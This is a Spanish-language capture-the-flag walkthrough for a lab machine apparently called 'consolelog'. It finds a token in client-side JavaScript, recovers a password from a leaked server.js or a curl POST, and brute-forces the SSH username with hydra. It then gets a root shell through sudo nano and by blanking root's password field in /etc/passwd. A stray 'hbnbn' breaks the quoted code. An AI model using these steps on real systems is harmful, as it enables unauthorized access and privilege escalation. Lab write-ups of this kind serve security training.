PORT     STATE SERVICE
80/tcp   open  http
3000/tcp open  http Node.js Express framework
5000/tcp open  ssh

-Entramos el puerto 80 y nos encontramos un botón que aparentemente no hace nada

-Hacemos 'Botón Derecho' + Inspect . Nos vamos a la pestaña de 'Console.log' y le damos al botón. Vemos que al hacer click se llama a la función 'authenticate':
	function autenticate() {
	    console.log("Para opciones de depuracion, el token de /recurso/ es tokentraviesito");
	}

-Tenemos un token.

-Entramos por el puerto 3000 y nos vemos nada

### Forma Fácil:

-Hacemos fuzzing en el puerto 80 y encontramos la ruta '/backend/' . Encontramos una serie de ficheros, abrimos 'server.js':
	const port = 3000;
	app.use(express.json());
	app.post('/recurso/', (req, res) => {
	    const token = req.body.token;
	    if (token === 'tokentraviesito') hbnbn
	        res.send('lapassworddebackupmaschingonadetodas');
	    } else {
	        res.status(401).send('Unauthorized');
	    }
	});
-Hemos encontrado la contraseña: 'lapassworddebackupmaschingonadetodas'

### Forma Difícil

-Sabemos que el endpoint -http://consolelog:3000/recurso está configurado para que si recibe una petición por POST , en formato JSON y con el token = tokentraviesito , nos devuelve la contraseña:
	-curl -X POST "http://consolelog:3000/recurso/" -H "Content-Type: application/json" -d '{"token": "tokentraviesito"}'
	 **-H (Header)**: Este encabezado indica que el contenido del cuerpo de la solicitud  es de tipo **JSON**.
	 **-d**: Permite enviar datos en el cuerpo de la solicitud. Aquí, se envía un JSON con la estructura:
		{ "token": "tokentraviesito" }

lapassworddebackupmaschingonadetodas

-Hacemos fuerza bruta a SSH con la contraseña obtenida para averiguar el usuario:
	-hydra ssh://172.19.0.2:5000 -L /usr/share/wordlists/rockyou.txt -p lapassworddebackupmaschingonadetodas -V
	[ssh] host: 172.17.0.2   login: lovely   password: lapassworddebackupmaschingonadetodas

-Nos autenticamos por SSH con las credenciales:
	ssh -p 5000 lovely@172.17.0.2
	-password: lapassworddebackupmaschingonadetodas

lovely@41f69bf29aa9:~$

## Escalada de Privilegios

sudo -l:
	(ALL) NOPASSWD: /usr/bin/nano

-2 Formas:
	-Gtfobins:
		sudo /usr/bin/nano
		^R ^x 
		reset; sh 1>&0 2>&0
		root@41f69bf29aa9:/#
	-Editando el /etc/passwd
		sudo nano /etc/passwd
		-Le quitamos la 'x' a root para autenticarnos como root sin contraseña
		-su root
		root@41f69bf29aa9:/# whoami
		root

